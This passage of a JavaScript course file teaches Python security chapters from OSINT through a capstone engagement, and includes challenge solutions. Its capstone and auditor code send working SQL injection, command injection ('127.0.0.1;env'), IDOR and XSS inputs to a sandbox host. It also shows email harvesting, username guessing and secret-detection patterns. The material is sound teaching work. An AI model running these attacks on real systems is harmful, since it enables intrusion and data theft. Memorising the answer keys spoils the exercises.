      { code: 'import re\npage = "Contact a.smith@corp.com or jdoe@corp.com; ceo is m.wong@corp.com"\nemails = sorted(set(re.findall(r"[\\w.]+@[\\w.]+", page)))\nprint(emails)\n# Derive likely usernames:\nprint([e.split("@")[0] for e in emails])' },
      { h: 'Username patterns across a company' },
      { code: 'def usernames(first, last):\n    f, l = first.lower(), last.lower()\n    return [f + l, f + "." + l, f[0] + l, f + l[0], l + f[0]]\n\nprint(usernames("Alice", "Smith"))' },
      { p: 'From one confirmed format (say `first.last`) you can predict every employee\'s login and email — which is why HR pages and conference talks are recon goldmines, and why per-account MFA matters so much.' },
      { h: 'Metadata and tech fingerprinting' },
      { code: 'import requests\nr = requests.get("http://shop.local/")\nprint("Server:", r.headers.get("Server"))\nfor line in requests.get("http://shop.local/robots.txt").text.splitlines():\n    if line.startswith("Disallow"):\n        print("hidden path hint:", line.split()[1])' },
      { warn: 'OSINT uses only public data, but it is not harmless — it is the reconnaissance phase of real attacks. Do it against your own org (or with authorization) to see what you are exposing, then reduce that footprint.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Extract all email addresses from the text and print the sorted unique list.',
        starter: 'text = "reach ops@corp.com, ops@corp.com or ceo@corp.com"\n',
        expect: "['ceo@corp.com', 'ops@corp.com']",
        solution: 'import re\ntext = "reach ops@corp.com, ops@corp.com or ceo@corp.com"\nprint(sorted(set(re.findall(r"[\\w.]+@[\\w.]+", text))))' },
      { kind: 'code', prompt: 'Probe subdomains of shop.local: print each live host among ["www", "intranet"] (www resolves to shop.local itself).',
        validate: 'osint_subs',
        solution: 'import requests\nfor sub in ["www", "intranet"]:\n    host = "shop.local" if sub == "www" else f"{sub}.local"\n    try:\n        requests.get(f"http://{host}/", timeout=2)\n        print(host)\n    except Exception:\n        pass' },
      { kind: 'code', prompt: 'Generate username candidates for "John Doe" in first.last and flast formats. Print the list.',
        expect: "['john.doe', 'jdoe']",
        solution: 'first, last = "John", "Doe"\nf, l = first.lower(), last.lower()\nprint([f + "." + l, f[0] + l])' },
      { kind: 'mc', prompt: 'OSINT is powerful because:',
        options: ['It hacks systems', 'It maps the attack surface from data the target already exposes',
                  'It is undetectable always', 'It requires no skill'],
        answer: 1 },
      { kind: 'code', prompt: 'Read shop.local robots.txt and print the number of hidden paths it discloses.',
        expect: '2',
        solution: 'import requests\nt = requests.get("http://shop.local/robots.txt").text\nprint(sum(1 for l in t.splitlines() if l.startswith("Disallow")))' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy26', title: 'Building Security Tools', sub: 'a real CLI scanner from the pieces you now own',
    teach: [
      { p: 'You now have every building block. This chapter assembles them into the kind of tool an analyst actually keeps in their kit: structured, reusable, and reporting clearly.' },
      { h: 'A multi-check web auditor' },
      { code: 'import requests\n\ndef audit(base):\n    findings = []\n\n    # 1. Information disclosure via robots.txt\n    r = requests.get(f"{base}/robots.txt")\n    if r.status_code == 200 and "Disallow" in r.text:\n        findings.append(("INFO", "robots.txt lists hidden paths"))\n\n    # 2. Reflected XSS on search\n    probe = "<xss>"\n    r = requests.get(f"{base}/search", params={"q": probe})\n    if probe in r.text:\n        findings.append(("HIGH", "reflected XSS on /search"))\n\n    # 3. SQL injection on login\n    r = requests.post(f"{base}/login", data={"username": "x\'--", "password": "y"})\n    if "CTF" in r.text or "Welcome" in r.text:\n        findings.append(("CRITICAL", "SQL injection auth bypass on /login"))\n\n    return findings\n\nfor severity, desc in audit("http://shop.local"):\n    print(f"[{severity:>8}] {desc}")' },
      { h: 'Ranking and reporting' },
      { code: 'findings = [("HIGH", "XSS"), ("CRITICAL", "SQLi"), ("INFO", "banner")]\norder = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}\nfor sev, desc in sorted(findings, key=lambda f: order[f[0]]):\n    print(f"{sev}: {desc}")' },
      { h: 'Structured output for other tools' },
      { code: 'import json\nreport = {"target": "shop.local",\n          "findings": [{"severity": "CRITICAL", "title": "SQLi"}]}\nprint(json.dumps(report, indent=2))' },
      { tip: 'Good tools are composable: each check is a function returning findings, the runner aggregates, and output is both human-readable and machine-readable (JSON) so it feeds a pipeline. That structure is what separates a script from a tool.' },
      { warn: 'A finding is a hypothesis until verified. Automated scanners produce false positives; always confirm manually before reporting, and never run your tool against anything outside your authorized scope.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Write a check that returns "vulnerable" if /search reflects a probe, else "safe". Print the result for shop.local.',
        expect: 'vulnerable',
        solution: 'import requests\ndef check(base):\n    r = requests.get(f"{base}/search", params={"q": "<probe123>"})\n    return "vulnerable" if "<probe123>" in r.text else "safe"\nprint(check("http://shop.local"))' },
      { kind: 'code', prompt: 'Run all three audit checks against shop.local and print the count of findings.',
        expect: '3',
        solution: 'import requests\ndef audit(base):\n    f = []\n    if "Disallow" in requests.get(f"{base}/robots.txt").text:\n        f.append("info")\n    if "<x>" in requests.get(f"{base}/search", params={"q": "<x>"}).text:\n        f.append("xss")\n    if "CTF" in requests.post(f"{base}/login", data={"username": "admin\'--", "password": "y"}).text:\n        f.append("sqli")\n    return f\nprint(len(audit("http://shop.local")))' },
      { kind: 'code', prompt: 'Sort findings by severity (CRITICAL first) and print the titles in order, comma-separated.',
        starter: 'findings = [("LOW", "banner"), ("CRITICAL", "sqli"), ("HIGH", "xss")]\n',
        expect: 'sqli, xss, banner',
        solution: 'findings = [("LOW", "banner"), ("CRITICAL", "sqli"), ("HIGH", "xss")]\norder = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}\nprint(", ".join(f[1] for f in sorted(findings, key=lambda x: order[x[0]])))' },
      { kind: 'code', prompt: 'Emit a JSON report with target "shop.local" and one CRITICAL finding titled "SQLi". Print it (sorted keys).',
        expect: '{"findings": [{"severity": "CRITICAL", "title": "SQLi"}], "target": "shop.local"}',
        solution: 'import json\nr = {"target": "shop.local", "findings": [{"severity": "CRITICAL", "title": "SQLi"}]}\nprint(json.dumps(r, sort_keys=True))' },
      { kind: 'mc', prompt: 'Why emit findings as JSON in addition to text?',
        options: ['It looks nicer', 'So other tools and pipelines can consume the results',
                  'It is required', 'To hide them'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy27', title: 'Defensive Automation & Blue Team', sub: 'detection rules, alerting and hardening at scale',
    teach: [
      { p: 'Offense finds one hole; defense must cover them all, continuously. Blue-team Python automates detection, enrichment and response so humans focus on real incidents.' },
      { h: 'A detection rule engine' },
      { code: 'def make_rule(name, predicate, severity):\n    return {"name": name, "match": predicate, "severity": severity}\n\nrules = [\n    make_rule("brute force", lambda e: e["type"] == "auth_fail" and e["count"] >= 5, "high"),\n    make_rule("off-hours admin", lambda e: e.get("user") == "admin" and e["hour"] >= 22, "medium"),\n    make_rule("data exfil", lambda e: e.get("bytes_out", 0) > 10_000_000, "critical"),\n]\n\nevents = [\n    {"type": "auth_fail", "count": 7, "hour": 3},\n    {"type": "login", "user": "admin", "hour": 23},\n    {"type": "transfer", "bytes_out": 50_000_000},\n]\nfor e in events:\n    for rule in rules:\n        if rule["match"](e):\n            print(f"[{rule[\'severity\'].upper()}] {rule[\'name\']} -> {e}")' },
      { h: 'Enrichment: add context to raw events' },
      { code: 'threat_intel = {"198.51.100.9": "known C2", "203.0.113.7": "TOR exit"}\ndef enrich(ip):\n    return threat_intel.get(ip, "unknown")\n\nfor ip in ["198.51.100.9", "10.0.0.5"]:\n    print(ip, "->", enrich(ip))' },
      { h: 'Rate-based alerting with a sliding window' },
      { code: 'from collections import deque\nfrom datetime import datetime, timedelta\n\nclass RateAlert:\n    def __init__(self, limit, window_seconds):\n        self.limit = limit\n        self.window = timedelta(seconds=window_seconds)\n        self.events = deque()\n    def hit(self, when):\n        self.events.append(when)\n        while self.events and when - self.events[0] > self.window:\n            self.events.popleft()\n        return len(self.events) >= self.limit\n\nalert = RateAlert(limit=3, window_seconds=60)\nbase = datetime(2026, 1, 5, 12, 0, 0)\nfor i in range(4):\n    fired = alert.hit(base + timedelta(seconds=i * 10))\n    print(i, "ALERT" if fired else "ok")' },
      { h: 'Automated response (carefully)' },
      { code: 'blocklist = set()\ndef respond(ip, severity):\n    if severity == "critical":\n        blocklist.add(ip)\n        return f"blocked {ip}"\n    return f"logged {ip} for review"\n\nprint(respond("198.51.100.9", "critical"))\nprint(sorted(blocklist))' },
      { tip: 'Detection engineering is iterative: write a rule, measure its false-positive rate, tune the threshold, repeat. A rule that cries wolf gets ignored — precision matters as much as coverage.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Apply the brute-force rule (auth_fail with count>=5) and print the severity for the matching event.',
        starter: 'event = {"type": "auth_fail", "count": 8}\nrule = {"name": "brute force", "match": lambda e: e["type"] == "auth_fail" and e["count"] >= 5, "severity": "high"}\n',
        expect: 'high',
        solution: 'event = {"type": "auth_fail", "count": 8}\nrule = {"name": "brute force", "match": lambda e: e["type"] == "auth_fail" and e["count"] >= 5, "severity": "high"}\nif rule["match"](event):\n    print(rule["severity"])' },
      { kind: 'code', prompt: 'Enrich the IPs against threat intel; print each IP that is known-bad.',
        starter: 'intel = {"198.51.100.9": "C2", "203.0.113.7": "TOR"}\nseen = ["10.0.0.5", "198.51.100.9", "8.8.8.8", "203.0.113.7"]\n',
        expect: '198.51.100.9\n203.0.113.7',
        solution: 'intel = {"198.51.100.9": "C2", "203.0.113.7": "TOR"}\nseen = ["10.0.0.5", "198.51.100.9", "8.8.8.8", "203.0.113.7"]\nfor ip in seen:\n    if ip in intel:\n        print(ip)' },
      { kind: 'code', prompt: 'Auto-block: given (ip, severity) events, print the sorted blocklist of IPs whose severity is critical.',
        starter: 'events = [("1.1.1.1", "low"), ("2.2.2.2", "critical"), ("3.3.3.3", "critical")]\n',
        expect: "['2.2.2.2', '3.3.3.3']",
        solution: 'events = [("1.1.1.1", "low"), ("2.2.2.2", "critical"), ("3.3.3.3", "critical")]\nblock = {ip for ip, sev in events if sev == "critical"}\nprint(sorted(block))' },
      { kind: 'mc', prompt: 'Why does a noisy detection rule get ignored?',
        options: ['It is slow', 'A high false-positive rate trains analysts to dismiss it (alert fatigue)',
                  'It uses too much memory', 'It cannot be tuned'],
        answer: 1 },
      { kind: 'mc', prompt: 'Enrichment adds ______ to raw events.',
        options: ['encryption', 'context (threat intel, geolocation, asset value)',
                  'more events', 'timestamps only'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy28', title: 'Cloud & API Security', sub: 'keys, IAM, rate limits and the modern attack surface',
    teach: [
      { p: 'Most systems now live in the cloud and talk over APIs. The vulnerabilities move up the stack: leaked keys, over-broad permissions, and unauthenticated endpoints replace buffer overflows.' },
      { h: 'Secrets do not belong in code' },
      { code: 'import os\n# WRONG: hardcoded, ends up in git history forever\n# API_KEY = "sk_live_abc123"\n# RIGHT: from the environment / a secrets manager\napi_key = os.environ.get("API_KEY", "<not set>")\nprint("key loaded from env:", api_key != "<not set>" or "use a real secret store")' },
      { warn: 'Committed secrets are the #1 cloud breach cause. Bots scan every public commit within seconds. If a key touches git even once, it is compromised — rotate it, do not just delete the line.' },
      { h: 'Scanning your own code for leaked secrets' },
      { code: 'import re\ncode = \'\'\'\nAWS_KEY = "AKIAIOSFODNN7EXAMPLE"\ngithub_pat = "ghp_1234567890abcdefghijklmnopqrstuvwx"\nnormal = "just a string"\n\'\'\'\npatterns = {\n    "AWS access key": r"AKIA[0-9A-Z]{16}",\n    "GitHub PAT": r"ghp_[0-9A-Za-z]{36}",\n    "generic secret": r"(?i)(secret|password|api_key)\\s*=\\s*[\\\'\\\"][^\\\'\\\"]{8,}",\n}\nfor name, pat in patterns.items():\n    if re.search(pat, code):\n        print("LEAK:", name)' },
      { h: 'Least privilege for IAM' },
      { code: '# An over-permissive policy vs a scoped one:\nbad = {"Effect": "Allow", "Action": "*", "Resource": "*"}\ngood = {"Effect": "Allow", "Action": ["s3:GetObject"], "Resource": "arn:aws:s3:::my-bucket/*"}\ndef is_overbroad(p):\n    return p["Action"] == "*" or p["Resource"] == "*"\nprint(is_overbroad(bad), is_overbroad(good))' },
      { h: 'Respecting (and testing) rate limits' },
      { code: 'import time\ndef rate_limited_calls(n, per_second):\n    delay = 1.0 / per_second\n    for i in range(n):\n        # do the call...\n        time.sleep(delay)     # simulated; polite clients back off\n    return f"made {n} calls at {per_second}/s"\nprint(rate_limited_calls(3, 10))' },
      { tip: 'API security checklist: authenticate every endpoint, authorize every object (no IDOR), rate-limit to blunt brute force and scraping, validate all input, never trust client-set fields (price, role, user_id), and keep secrets out of code and logs.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Scan the code snippet for an AWS access key (AKIA...) and print `LEAK` if found.',
        starter: 'code = \'config = {"key": "AKIAIOSFODNN7EXAMPLE"}\'\n', expect: 'LEAK',
        solution: 'import re\ncode = \'config = {"key": "AKIAIOSFODNN7EXAMPLE"}\'\nif re.search(r"AKIA[0-9A-Z]{16}", code):\n    print("LEAK")' },
      { kind: 'code', prompt: 'Load a secret from the environment (default "MISSING") and print whether it is set.',
        starter: 'import os\n', expect: 'MISSING',
        solution: 'import os\nprint(os.environ.get("API_KEY", "MISSING"))' },
      { kind: 'code', prompt: 'Flag over-broad IAM policies: print the name of each policy using "*" for Action.',
        starter: 'policies = [{"name": "admin", "Action": "*"}, {"name": "reader", "Action": "s3:Get"}]\n',
        expect: 'admin',
        solution: 'policies = [{"name": "admin", "Action": "*"}, {"name": "reader", "Action": "s3:Get"}]\nfor p in policies:\n    if p["Action"] == "*":\n        print(p["name"])' },
      { kind: 'mc', prompt: 'A secret was accidentally committed to git, then removed in the next commit. It is:',
        options: ['Safe now', 'Still compromised — it lives in history and was likely scraped',
                  'Only at risk if the repo is public forever', 'Automatically rotated'],
        answer: 1 },
      { kind: 'mc', prompt: 'The principle of least privilege means:',
        options: ['Give admins everything', 'Grant only the minimum permissions each role needs',
                  'Deny all access', 'Use one shared account'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy29', title: 'Supply Chain & Dependency Security', sub: 'typosquatting, pinning, and trusting your dependencies',
    teach: [
      { p: 'Your code is only as secure as the code it imports. Modern apps pull in hundreds of packages; each is a trust decision, and attackers know it.' },
      { h: 'Typosquatting' },
      { code: '# Attackers publish malicious packages with names close to popular ones:\npopular = {"requests", "numpy", "pandas", "cryptography", "pyyaml"}\nsuspicious = ["reqeusts", "requsts", "python-requests", "requests"]\n\ndef looks_typosquatted(name, real_set):\n    if name in real_set:\n        return False\n    for real in real_set:\n        # tiny edit distance from a real package = suspicious\n        if abs(len(name) - len(real)) <= 2 and sorted(name) == sorted(real):\n            return True\n    return False\n\nfor pkg in suspicious:\n    print(pkg, "->", "SUSPICIOUS" if looks_typosquatted(pkg, popular) else "check")' },
      { warn: 'A single `pip install reqeusts` (typo) can run arbitrary code from `setup.py` at install time — before you ever import it. This has delivered real malware to thousands of developers.' },
      { h: 'Pinning and verifying' },
      { code: '# requirements.txt should pin exact versions AND hashes:\nrequirement = "requests==2.32.3 --hash=sha256:abc123..."\nprint("pinned version stops surprise upgrades")\nprint("the hash stops a tampered package from installing")' },
      { h: 'Auditing your dependency tree' },
      { code: 'installed = {"requests": "2.28.0", "urllib3": "1.26.5", "pyyaml": "5.3.1"}\nknown_vulnerable = {"pyyaml": "< 5.4", "urllib3": "< 1.26.18"}\n\ndef version_lt(v, bound):\n    a = [int(x) for x in v.split(".")]\n    b = [int(x) for x in bound.split(".")]\n    return a < b\n\nfor pkg, ver in installed.items():\n    if pkg in known_vulnerable:\n        bound = known_vulnerable[pkg].replace("< ", "")\n        if version_lt(ver, bound):\n            print(f"VULNERABLE {pkg} {ver} (fixed in {bound})")' },
      { h: 'The defences' },
      { list: [
        'Pin exact versions and hashes; use a lockfile',
        'Run `pip-audit` / `safety` in CI to catch known CVEs',
        'Verify package names character by character before installing',
        'Minimise dependencies — every one is attack surface',
        'Watch for install-time code execution and unexpected network calls'
      ] },
      { tip: 'SBOM (Software Bill of Materials) is the emerging standard: a machine-readable list of every component you ship, so when the next Log4Shell drops you can answer "are we affected?" in seconds instead of weeks.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Detect the typosquat: print the package name that is an anagram of "requests" but not exactly it.',
        starter: 'real = "requests"\ncandidates = ["requests", "reqeusts", "numpy"]\n',
        expect: 'reqeusts',
        solution: 'real = "requests"\ncandidates = ["requests", "reqeusts", "numpy"]\nfor c in candidates:\n    if c != real and sorted(c) == sorted(real):\n        print(c)' },
      { kind: 'code', prompt: 'Audit versions: print each package installed below its safe version.',
        starter: 'installed = {"pyyaml": "5.3.1", "requests": "2.32.3"}\nsafe = {"pyyaml": "5.4.0", "requests": "2.30.0"}\n',
        expect: 'pyyaml',
        solution: 'installed = {"pyyaml": "5.3.1", "requests": "2.32.3"}\nsafe = {"pyyaml": "5.4.0", "requests": "2.30.0"}\ndef lt(a, b):\n    return [int(x) for x in a.split(".")] < [int(x) for x in b.split(".")]\nfor p, v in installed.items():\n    if lt(v, safe[p]):\n        print(p)' },
      { kind: 'mc', prompt: 'Why is a typosquatted package dangerous even if you never import it?',
        options: ['It slows pip', 'setup.py can run arbitrary code at install time',
                  'It takes disk space', 'It cannot be, actually'],
        answer: 1 },
      { kind: 'mc', prompt: 'Pinning a hash in requirements.txt protects against:',
        options: ['Slow downloads', 'A tampered or replaced package installing silently',
                  'Typos in your code', 'Network outages'],
        answer: 1 },
      { kind: 'mc', prompt: 'An SBOM lets you quickly answer:',
        options: ['How fast is my code', 'Which components am I shipping, and am I affected by this new CVE',
                  'Who wrote each line', 'How many tests pass'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy30', title: 'Secure Coding & Code Review', sub: 'spotting the bug before it ships',
    teach: [
      { p: 'The cheapest vulnerability is the one caught in review. This chapter trains the eye: given code, find the flaw and the fix. It ties every prior chapter together from the defender\'s side.' },
      { h: 'The dangerous sinks to grep for' },
      { list: [
        '`eval` / `exec` / `compile` on any untrusted input',
        '`subprocess(..., shell=True)`, `os.system` with user data',
        'string-built SQL instead of parameters',
        '`pickle.loads`, `yaml.load` on external data',
        '`==` for comparing secrets (timing) — use `hmac.compare_digest`',
        'MD5/SHA for passwords; `random` for tokens',
        'user input reflected into HTML without escaping'
      ] },
      { h: 'Review drill: what is wrong here?' },
      { code: 'import hashlib\n# BUG: fast unsalted hash for passwords\ndef store_password(pw):\n    return hashlib.md5(pw.encode()).hexdigest()\n\n# FIX:\nimport hashlib, secrets\ndef store_password_fixed(pw):\n    salt = secrets.token_bytes(16)\n    dk = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 200_000)\n    return salt.hex() + "$" + dk.hex()\n\nprint(store_password("x")[:8], "...(broken)")\nprint(store_password_fixed("x")[:8], "...(sound)")' },
      { code: '# BUG: comparing a token with == leaks timing\ndef check_bad(given, expected):\n    return given == expected\n\n# FIX:\nimport hmac\ndef check_good(given, expected):\n    return hmac.compare_digest(given, expected)\n\nprint(check_good("abc", "abc"))' },
      { h: 'Validate input at the boundary' },
      { code: 'def validate_port(raw):\n    if not raw.isdigit():\n        raise ValueError("port must be numeric")\n    port = int(raw)\n    if not (1 <= port <= 65535):\n        raise ValueError("port out of range")\n    return port\n\nprint(validate_port("8080"))\nfor bad in ["-1", "99999", "80; rm"]:\n    try:\n        validate_port(bad)\n    except ValueError as e:\n        print("rejected", repr(bad), "-", e)' },
      { tip: 'A useful review heuristic: for every piece of external input, trace it to where it is *used*. If it reaches a sink (query, shell, HTML, deserializer) without being neutralised for that context, you have found a bug.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Fix the timing-unsafe comparison. Make it use hmac.compare_digest and print True.',
        starter: 'def check(given, expected):\n    return given == expected\nprint(check("tok", "tok"))',
        expect: 'True',
        solution: 'import hmac\ndef check(given, expected):\n    return hmac.compare_digest(given, expected)\nprint(check("tok", "tok"))' },
      { kind: 'code', prompt: 'Fix the SQL: rewrite this to use a parameterised query and print the safe rows for input "x\' OR 1=1".',
        starter: 'import sqlite3\ncon = sqlite3.connect(":memory:")\ncon.execute("CREATE TABLE u (name)")\ncon.execute("INSERT INTO u VALUES (\'admin\')")\nname = "x\' OR 1=1"\nrows = con.execute("SELECT * FROM u WHERE name = \'" + name + "\'").fetchall()\nprint(rows)',
        expect: '[]',
        solution: 'import sqlite3\ncon = sqlite3.connect(":memory:")\ncon.execute("CREATE TABLE u (name)")\ncon.execute("INSERT INTO u VALUES (\'admin\')")\nname = "x\' OR 1=1"\nprint(con.execute("SELECT * FROM u WHERE name = ?", (name,)).fetchall())' },
      { kind: 'code', prompt: 'Validate the input: print the int for valid ports and `rejected` otherwise, one per line.',
        starter: 'raw_values = ["443", "70000", "22; ls"]\n',
        expect: '443\nrejected\nrejected',
        solution: 'raw_values = ["443", "70000", "22; ls"]\nfor raw in raw_values:\n    if raw.isdigit() and 1 <= int(raw) <= 65535:\n        print(int(raw))\n    else:\n        print("rejected")' },
      { kind: 'mc', prompt: 'The review heuristic "trace input to sink" means:',
        options: ['Run the code', 'Follow each external value to where it is used and check it is neutralised for that context',
                  'Delete all input', 'Add more comments'],
        answer: 1 },
      { kind: 'mc', prompt: 'Which is a dangerous sink for untrusted data?',
        options: ['print()', 'subprocess with shell=True', 'len()', 'sorted()'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy31', title: 'Incident Response & Automation', sub: 'from alert to containment with a playbook in code',
    teach: [
      { p: 'When something fires, speed and consistency win. IR playbooks encode the steps — detect, triage, contain, eradicate, recover, learn — so a 3am responder does the right thing every time.' },
      { h: 'The lifecycle, as functions' },
      { code: 'def triage(alert):\n    score = 0\n    if alert.get("severity") == "critical": score += 50\n    if alert.get("asset_tier") == "crown_jewels": score += 30\n    if alert.get("external"): score += 20\n    return "P1" if score >= 70 else "P2" if score >= 40 else "P3"\n\nprint(triage({"severity": "critical", "asset_tier": "crown_jewels", "external": True}))\nprint(triage({"severity": "low", "asset_tier": "dev"}))' },
      { h: 'Containment actions' },
      { code: 'isolated = set()\ndef contain(host, action):\n    if action == "isolate":\n        isolated.add(host)\n        return f"{host}: network-isolated, evidence preserved"\n    if action == "disable_account":\n        return f"{host}: account disabled, sessions revoked"\n    return f"{host}: monitored"\n\nprint(contain("web01", "isolate"))\nprint(sorted(isolated))' },
      { warn: 'Containment is a trade-off: isolate too aggressively and you tip off the attacker or break the business; too slowly and they spread. Preserve evidence (memory, disk) *before* you wipe — you cannot investigate what you destroyed.' },
      { h: 'Building the incident timeline automatically' },
      { code: 'from datetime import datetime\nlogs = [\n    ("2026-01-05 12:44:07", "auth", "admin login from 10.10.0.66"),\n    ("2026-01-05 12:44:50", "proc", "reverse shell spawned"),\n    ("2026-01-05 12:40:01", "auth", "brute force begins"),\n    ("2026-01-05 12:45:30", "persist", "cron backdoor installed"),\n]\nprint("=== INCIDENT TIMELINE ===")\nfor ts, kind, msg in sorted(logs):\n    print(f"{ts} | {kind:<8} | {msg}")' },
      { h: 'Notification and reporting' },
      { code: 'def build_report(incident_id, severity, summary, actions):\n    return {\n        "id": incident_id, "severity": severity,\n        "summary": summary, "actions_taken": actions,\n        "status": "contained",\n    }\nimport json\nrpt = build_report("INC-2026-004", "P1", "SQLi -> admin -> reverse shell",\n                   ["isolated web01", "rotated creds", "blocked C2 IP"])\nprint(json.dumps(rpt, indent=2))' },
      { tip: 'The post-incident review is where you actually get safer: every incident should produce a concrete change — a new detection rule, a patched service, a hardened config. Automation captures that as code so the same attack fails next time.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Triage the alert: print P1 if severity is critical AND it targets crown_jewels, else P2.',
        starter: 'alert = {"severity": "critical", "asset": "crown_jewels"}\n',
        expect: 'P1',
        solution: 'alert = {"severity": "critical", "asset": "crown_jewels"}\nif alert["severity"] == "critical" and alert["asset"] == "crown_jewels":\n    print("P1")\nelse:\n    print("P2")' },
      { kind: 'code', prompt: 'Build the incident timeline: sort the events and print the first action the attacker took.',
        starter: 'logs = [("12:44", "login"), ("12:40", "brute force"), ("12:50", "exfil")]\n',
        expect: 'brute force',
        solution: 'logs = [("12:44", "login"), ("12:40", "brute force"), ("12:50", "exfil")]\nprint(sorted(logs)[0][1])' },
      { kind: 'code', prompt: 'Contain the critical hosts: print the sorted set of hosts to isolate (severity == critical).',
        starter: 'hosts = [("web01", "critical"), ("dev02", "low"), ("db01", "critical")]\n',
        expect: "['db01', 'web01']",
        solution: 'hosts = [("web01", "critical"), ("dev02", "low"), ("db01", "critical")]\nprint(sorted(h for h, sev in hosts if sev == "critical"))' },
      { kind: 'mc', prompt: 'Why preserve evidence before wiping a compromised host?',
        options: ['It is faster', 'You cannot investigate or attribute what you destroyed',
                  'It is legally optional', 'To save disk space'],
        answer: 1 },
      { kind: 'mc', prompt: 'The most valuable output of a post-incident review is:',
        options: ['A blame list', 'Concrete changes (new rules, patches) so the same attack fails next time',
                  'A longer report', 'Deleting the logs'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy32', title: 'Capstone: Full Engagement', sub: 'recon to report, chaining every skill',
    teach: [
      { p: 'This is the whole arc in one place. A real authorised assessment against the sandbox: enumerate, exploit, escalate, and report — each stage using the skills you built.' },
      { h: 'Stage 1 — Reconnaissance' },
      { code: 'import requests\nbase = "http://shop.local"\nprint("[*] recon")\nfor line in requests.get(f"{base}/robots.txt").text.splitlines():\n    if line.startswith("Disallow"):\n        print("    hidden:", line.split()[1])\nprint("    server:", requests.get(base).headers.get("Server"))' },
      { h: 'Stage 2 — Exploitation (SQLi auth bypass)' },
      { code: 'import requests\nbase = "http://shop.local"\nr = requests.post(f"{base}/login", data={"username": "admin\'--", "password": "x"})\nflag = "CTF{" in r.text\nprint("[+] SQLi auth bypass:", "SUCCESS" if flag else "failed")' },
      { h: 'Stage 3 — Data extraction (IDOR)' },
      { code: 'import requests\nbase = "http://shop.local"\nfor uid in range(1, 5):\n    r = requests.get(f"{base}/account", params={"id": uid})\n    if "CTF{" in r.text:\n        print(f"[+] IDOR leaked secret for account {uid}")' },
      { h: 'Stage 4 — Post-exploitation (command injection -> secrets)' },
      { code: 'import requests\nbase = "http://shop.local"\nr = requests.get(f"{base}/ping", params={"host": "127.0.0.1;env"})\nif "CTF{" in r.text:\n    print("[+] command injection leaked environment secret")' },
      { h: 'Stage 5 — The report writes itself' },
      { code: 'import json\nreport = {\n    "engagement": "shop.local assessment",\n    "findings": [\n        {"id": 1, "severity": "CRITICAL", "title": "SQL injection auth bypass",\n         "fix": "parameterised queries"},\n        {"id": 2, "severity": "HIGH", "title": "IDOR on /account",\n         "fix": "server-side ownership checks"},\n        {"id": 3, "severity": "CRITICAL", "title": "Command injection on /ping",\n         "fix": "argument list, no shell=True"},\n        {"id": 4, "severity": "HIGH", "title": "Reflected XSS on /search",\n         "fix": "context-aware output encoding"},\n    ],\n    "summary": "4 findings; 2 critical. Immediate remediation advised.",\n}\nprint(json.dumps(report, indent=2))' },
      { tip: 'The value you deliver is not the exploit — it is the *report*: clear findings, proof, severity, and an actionable fix for each. An assessment nobody can act on helped no one. You now have every skill to run this end to end.' },
      { p: 'You have finished the track. From `print("hello")` to a full authorised engagement, in real Python, against real (simulated) bugs. Keep the ethics as sharp as the skills — and go build things that make systems safer.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Stage 2: exploit the SQLi auth bypass and print `SUCCESS` if you capture a CTF flag.',
        expect: 'SUCCESS',
        solution: 'import requests\nr = requests.post("http://shop.local/login", data={"username": "admin\'--", "password": "x"})\nprint("SUCCESS" if "CTF{" in r.text else "failed")' },
      { kind: 'code', prompt: 'Stage 3: find every account id (1..4) whose /account response leaks a CTF flag. Print the list.',
        expect: '[1]',
        solution: 'import requests\nleaks = []\nfor uid in range(1, 5):\n    if "CTF{" in requests.get("http://shop.local/account", params={"id": uid}).text:\n        leaks.append(uid)\nprint(leaks)' },
      { kind: 'code', prompt: 'Stage 4: use command injection on /ping to leak the env secret; print True on success.',
        expect: 'True',
        solution: 'import requests\nr = requests.get("http://shop.local/ping", params={"host": "127.0.0.1;env"})\nprint("CTF{" in r.text)' },
      { kind: 'code', prompt: 'Chain it all: count how many of the four attacks (SQLi, IDOR, cmd-injection, XSS) succeed against shop.local. Print the number.',
        expect: '4',
        solution: 'import requests\nbase = "http://shop.local"\nn = 0\nif "CTF{" in requests.post(f"{base}/login", data={"username": "admin\'--", "password": "x"}).text:\n    n += 1\nif "CTF{" in requests.get(f"{base}/account", params={"id": 1}).text:\n    n += 1\nif "CTF{" in requests.get(f"{base}/ping", params={"host": "127.0.0.1;env"}).text:\n    n += 1\nif "<x>" in requests.get(f"{base}/search", params={"q": "<x>"}).text:\n    n += 1\nprint(n)' },
      { kind: 'mc', prompt: 'The real deliverable of a security engagement is:',
        options: ['The exploits', 'A clear report with findings, proof, severity and actionable fixes',
                  'A list of open ports', 'The tools used'],
        answer: 1 },
      { kind: 'mc', prompt: 'What must stay as sharp as your technical skills?',
        options: ['Your typing speed', 'Your ethics and authorization discipline',
                  'Your hardware', 'Your wordlists'],
        answer: 1 }
    ]
  }

  );
})(typeof window !== 'undefined' ? window : globalThis);
